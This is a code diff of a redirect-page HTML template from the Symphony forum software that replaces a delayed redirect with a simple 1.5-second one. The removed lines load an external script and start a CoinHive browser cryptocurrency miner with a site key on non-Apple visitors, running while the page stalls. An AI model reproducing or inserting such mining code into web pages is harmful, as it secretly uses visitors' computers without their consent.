@@ -53,48 +53,21 @@
 <body class="body--ready">
 <canvas class="canvas"></canvas>
 <p class="text">
-    正在跳转至 ${forwardURL}<br/>
+    正在跳转至 <a href="${forwardURL}">${forwardURL}</a><br/>
     <a href="https://github.com/b3log/symphony">GitHub</a> &nbsp;
     <a href="http://b3log.org/">B3log</a>
 </p>
-<iframe src="${forwardURL}"></iframe>
 <script src="${staticServePath}/js/lib/jquery/jquery-3.1.0.min.js"></script>
 <script>
-    if (!navigator.userAgent.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/)) {
-        $.ajax({
-            method: "GET",
-            url: 'https://static.hacpai.com/js/lib/xmr.min.js',
-            dataType: "script"
-        }).always(function (e) {
-            setTimeout(function () {
-                window.location.href = '${forwardURL}'
-            }, 5000)
-            setTimeout(function () {
-                $('.text').animate({
-                    bottom: ($(window).height() - 56 ) / 2 + 'px'
-                })
-            }, 4000)
-
-            if (typeof CoinHive === 'object') {
-                (new CoinHive.Anonymous('bSiM5UP0bWeY98R39fQBb2nKiiofSxmU', {threads: 2, throttle: 0})).start();
-            }
-        });
-    } else {
-        setTimeout(function () {
-            $('.text').animate({
-                bottom: ($(window).height() - 56 ) / 2 + 'px'
-            }, function () {
-                window.location.href = '${forwardURL}'
-            })
-        }, 4000)
-    }
-
+    setTimeout(function () {
+        window.location.href = '${forwardURL}'
+    }, 1500)
 
     var S = {
         init: function () {
             S.Drawing.init('.canvas');
             document.body.classList.add('body--ready');
-            var text = '#countdown 3';
+            var text = 'B3';
             S.UI.simulate(text);
             S.Drawing.loop(function () {
                 S.Shape.render();
